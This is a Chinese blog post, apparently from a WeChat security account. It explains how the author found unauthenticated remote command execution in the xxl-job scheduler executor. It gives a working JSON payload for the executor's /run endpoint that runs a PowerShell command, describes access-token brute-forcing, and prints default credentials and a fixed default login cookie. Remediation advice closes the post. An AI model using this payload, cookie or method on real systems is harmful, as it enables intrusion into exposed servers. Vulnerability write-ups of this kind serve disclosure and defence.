\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/94MZcz-NNh-Dl7zv5DYCAg)

  

**0x01**

**开篇废话**

  

我很喜欢 ASRC 某位大佬说过的一句话：**挖洞的本质就是信息收集**

一些开源项目的官方文档我们可以挖掘到很多有用信息，比如 API 利用、默认口令、硬编码等。

本文主要以提供思路为目的，现在网上已经公开 xxl-job 未授权 rce 漏洞。

在 GitHub 上能看到 xxl-job 与官网公开的文档。

首先我们先通过官方文档进行信息收集，了解这个东西是干嘛的，已经公开 API，最后再通过分析源码，发现漏洞。下面是从官方文档获取的信息。

官方文档：https://www.xuxueli.com/xxl-job/

后台回复 "**xxl-job**" 也可获得 exp 一键利用脚本及编译好的环境

  

**0x02**

**了解项目**

  

**工作原理：**

xxl-job 调度平台是一个分布式管理平台，通过调度平台可以设置定时任务，批量处理等分配给执行器执行。

**功能：**

1、可以执行脚本（支持以 GLUE 模式开发和运行脚本任务，包括 Shell、Python、NodeJS、PHP、PowerShell 等类型脚本）

2、原生提供通用命令行任务 Handler（Bean 任务，”CommandJobHandler”）；业务方只需要提供命令行即可

其它的都是线程、数据加密等方面的，对我们用处不大，就略过了。

| 

源码仓库地址

 |
| https://github.com/xuxueli/xxl-job |
| http://gitee.com/xuxueli0323/xxl-job |

部署方面这里也不谈了，节约时间，有兴趣的自己去看文档搭建

**xxl-job 整个平台有两个项目一个是调度中心，一个是执行器。  
**

**调度中心：**

调度中心项目：xxl-job-admin

  作用：统一管理任务调度平台上调度任务，负责触发调度执行，并且提供任务管理平台。

**执行器：**

  “执行器” 项目：xxl-job-executor-sample-springboot (提供多种版本执行器供选择，现以 springboot 版本为例，可直接使用，也可以参考其并将现有项目改造成执行器)

  作用：负责接收 “调度中心” 的调度并执行；可直接部署执行器，也可以将执行器集成到现有业务项目中。

信息收集差不多到这里了，文档也就介绍了这么多，下面是看配置文件，有没有初始默认口令以及未授权等。

从上可以看出，调度中心可以管理任务，并无直接执行命令的功能，而执行器才是执行脚本命令的关键。

  

**0x03**

**分析项目**

  

下面是调度中写配置，未发现有什么敏感信息及可利用。  

此处发现有个 “xxl.job.accessToken=“，猜测他应该也是鉴权有关，但是通过源码发现存在 session 校验，先记录。

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztMXibriaQMQSiaP2WyKFiamMQkxllDn6Imdp4KnZwkmLJC6J9PUmEKAFFicQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztThf5BOlTV09JBRqLXXzTMia2lTCyGsic1SP4jptxd2voEZEx5qDPTWKQ/640?wx_fmt=png)  

好家伙，发现了一个问题，搭建后默认口令 admin/123456，如果管理员未修改口令我们就可以登录后台去创建脚本任务执行命令了。这个实际中就得看运气了。

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztiarBb8DWPibRbWichlImeBlawSfGibeiaIoo9oriabDq0f2zwIbjIKE8bficA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztTIrCTnAdL9lKhEM76tCeOV3D5THFq1iaZicVomDVSmgQ37BT5t2W0w1g/640?wx_fmt=png)

**调度中心 RESTful API  
**

```
API服务位置：com.xxl.job.core.biz.AdminBiz（com.xxl.job.admin.controller.JobApiController ）
API服务请求参考代码：com.xxl.job.adminbiz.AdminBizTest
```

**任务回调**

```
    说明：执行器执行完任务后，回调任务结果时使用
    ------
    地址格式：{调度中心跟地址}/callback
    
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        \[{
            "logId":1,              // 本次调度日志ID
            "logDateTim":0,         // 本次调度日志时间
            "executeResult":{
                "code": 200,        // 200 表示任务执行正常，500表示失败
                "msg": null
            }
        }\]

    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null      // 错误提示消息
        }
```

**执行器注册**

```
    说明：执行器注册时使用，调度中心会实时感知注册成功的执行器并发起任务调度
    ------
    地址格式：{调度中心跟地址}/registry
    
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "registryGroup":"EXECUTOR",                     // 固定值
            "registryKey":"xxl-job-executor-example",       // 执行器AppName
            "registryValue":"http://127.0.0.1:9999/"        // 执行器地址，内置服务跟地址
        }

    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null      // 错误提示消息
        }
```

**执行器注册摘除**

```
    说明：执行器注册摘除时使用，注册摘除后的执行器不参与任务调度与执行
    ------
    地址格式：{调度中心跟地址}/registryRemove
    
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}

    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "registryGroup":"EXECUTOR",                     // 固定值
            "registryKey":"xxl-job-executor-example",       // 执行器AppName
            "registryValue":"http://127.0.0.1:9999/"        // 执行器地址，内置服务跟地址
        }

    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null      // 错误提示消息
        }
```

从公开调度中心 API 看到了 “XXL-JOB-ACCESS-TOKEN : {请求令牌}”，说明是靠 XXL-JOB-ACCESS-TOKEN 进行 API 鉴权，不过调度中心的 API 并没啥用。调度中心似乎也没啥可以利用的了，我们还是看主要执行命令的执行器吧。 

下面是执行器配置，一眼就看到了 “XXL-JOB-ACCESS-TOKEN : {请求令牌}”，因为执行器都是通过调度中心控制的，没有 web 页面，它会是怎么处理调度器给自己的指令呢？这时候我的大脑第一反应就是通过 API ，文档往后翻也看得到官方公开的执行器 API。先不要激动，我们暂时还不能拿他做什么，先看看配置文件。

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztAoht6hBd1AbibyDXzfV9U7VxQtTeFDxprSSbd3XKosAia8nqbdHq972w/640?wx_fmt=png)

这里面的参数大部分都是注册调度中心的信息。这里 “XXL-JOB-ACCESS-TOKEN : {请求令牌}”，执行器通讯 TOKEN \[选填\]：非空时启用。这句话很关键，下图是官方源码默认配置，默认是为空，那么就是不启用状态，对于开发人员他们安全意识薄弱，对于鉴权大多是直接忽略。

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztaGpwFvcZEXPcmmdYcO2yjxCvsicollzGqjm7QzYf4tIEYIcWFTGGlXg/640?wx_fmt=png)

感觉有点东西，我们去看看 API 怎么说吧。下面是官方执行器 API 接口信息。

**执行器 RESTful API**

```
API服务位置：com.xxl.job.core.biz.ExecutorBiz
API服务请求参考代码：com.xxl.job.executorbiz.ExecutorBizTest
```

**心跳检测**

```
说明：调度中心检测执行器是否在线时使用
------
地址格式：{执行器内嵌服务跟地址}/beat

Header：
    XXL-JOB-ACCESS-TOKEN : {请求令牌}
请求数据格式如下，放置在 RequestBody 中，JSON格式：

响应数据格式：
    {
      "code": 200,      // 200 表示正常、其他失败
     }
```

**忙碌检测**

```
    说明：调度中心检测指定执行器上指定任务是否忙碌（运行中）时使用
    ------
    地址格式：{执行器内嵌服务跟地址}/idleBeat

    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "jobId":1       // 任务ID
        }

    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null       // 错误提示消息
        }
```

**触发任务**

```
    说明：触发任务执行
    ------
    地址格式：{执行器内嵌服务跟地址}/run

    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "jobId":1,                                  // 任务ID
            "executorHandler":"demoJobHandler",         // 任务标识
            "executorParams":"demoJobHandler",          // 任务参数
            "executorBlockStrategy":"COVER\_EARLY",      // 任务阻塞策略，可选值参考 com.xxl.job.core.enums.ExecutorBlockStrategyEnum
            "executorTimeout":0,                        // 任务超时时间，单位秒，大于零时生效
            "logId":1,                                  // 本次调度日志ID
            "logDateTime":1586629003729,                // 本次调度日志时间
            "glueType":"BEAN",                          // 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum
            "glueSource":"xxx",                         // GLUE脚本代码
            "glueUpdatetime":1586629003727,             // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新
            "broadcastIndex":0,                         // 分片参数：当前分片
            "broadcastTotal":0                          // 分片参数：总分片
        }

    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null       // 错误提示消息
        }
```

**终止任务**

```
    说明：终止任务
    ------
    地址格式：{执行器内嵌服务跟地址}/kill

    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "jobId":1       // 任务ID
        }

    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null       // 错误提示消息
        }
```

**查看执行日志**

```
    说明：终止任务，滚动方式加载
    ------
    地址格式：{执行器内嵌服务跟地址}/log

    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "logDateTim":0,     // 本次调度日志时间
            "logId":0,          // 本次调度日志ID
            "fromLineNum":0     // 日志开始行号，滚动加载日志
        }

    响应数据格式：
        {
            "code":200,         // 200 表示正常、其他失败
            "msg": null         // 错误提示消息
            "content":{
                "fromLineNum":0,        // 本次请求，日志开始行数
                "toLineNum":100,        // 本次请求，日志结束行号
                "logContent":"xxx",     // 本次请求日志内容
                "isEnd":true            // 日志是否全部加载完
            }
        }
```

这个触发任务成功引起了我的注意。根据文档 API 构造参数试试看，果真执行命令成功。

  

**0x04**

****验证漏洞****

  

**Payload：**

```
{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER\_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE\_POWERSHELL",
  "glueSource": "calc",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

需要注意 "glueUpdatetime"，看官方怎么描述的

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztbRwkyF5wKXGzRFehvxLTjxtWibLCTUxFXkmibKtxQe7CqNfiaAXNuzo8w/640?wx_fmt=png)

意思就是如果 GLUE 时间未改变的话，将不读取参数中命令，而是执行上次创建的任务。

**判断任务逻辑：**

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGezt4S20eGFJNIVFbRCgdO6jloboiaZSHGd0nwic3wLJQpVqiatrHibF5SdwUw/640?wx_fmt=png)

所以每次执行不同任务则需要修改 jobId 或者 glueUpdatetime

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztqcX6GTysaupBknYU35yheyepibIRicgJDEx7tyKglZuhmqckIyYhLVsg/640?wx_fmt=png)

包括上线 cs 命令都没问题

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGezte5MYibPiaA2ZQfFjMpLYUS3sLoa3Fywn2cgSjYvSg5J9Sl8HibJYwibQqg/640?wx_fmt=png)

  

**0x05**

**扩展利用方式**

  

如果对方开发人员设置了 “XXL-JOB-ACCESS-TOKEN“，我们也是可以通过爆破去执行命令。  

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGezticyBAlq0FiaRRQVHN2Mrh0hlxxGGIFLt34jpyO5G7svA7QmRnIPPVTdg/640?wx_fmt=png)

**Token 错误返回包**

```
HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 47

{"code":500,"msg":"The access token is wrong."}
```

**Token 正确返回包**

```
HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 12

{"code":200}
```

**意外发现**

用户登录 cookie 是固定的，此漏洞使用中间人攻击，截获数据包可利用，用户不改密码 cookie 一直有效。

默认 cookie（admin/123456）：

```
XXL\_JOB\_LOGIN\_IDENTITY：7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d
```

![](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxYP2FC2tKfUDQr2kaJGeztAaoD0Y9va7weHsiausjcNEtyONo8oSJicBwYGjPI8N8Hic8dEficGIJSXA/640?wx_fmt=png)

  

**0x06**

**整改建议**

  

临时方案：XXL-JOB-ACCESS-TOKEN 设置为强字符串，不易爆破。  

解决方案：将 “XXL-JOB-ACCESS-TOKEN” 修改为每次启动随机生成值，并且为强口令不易爆破。

  

**0x07**

**总结**

  

这次纯分析官方文档挖掘 0day 的思路，让我更坚信 “渗透的本质就是信息收集 “这句话。只要细心去收集信息，挖洞也不是什么难事。  

对于漏洞复现的同学，我写了个脚本。关注公众号，后台回复 “**xxl-job**” 即可获得 exp 一键利用脚本及编译好的环境。

8  

**0x08**

**往期推荐**

  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)  

[干货 | 常用渗透漏洞 poc、exp 收集整理](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485181&idx=3&sn=9eb034dd011ac71c4e3732129c332bb3&chksm=ea37f9a7dd4070b1545a9cb71ba14c8ced10aa30a0b43fb5052aed40da9ca43ac90e9c37f55a&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)  

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)  如果对你有所帮助，点个分享、赞、在看呗！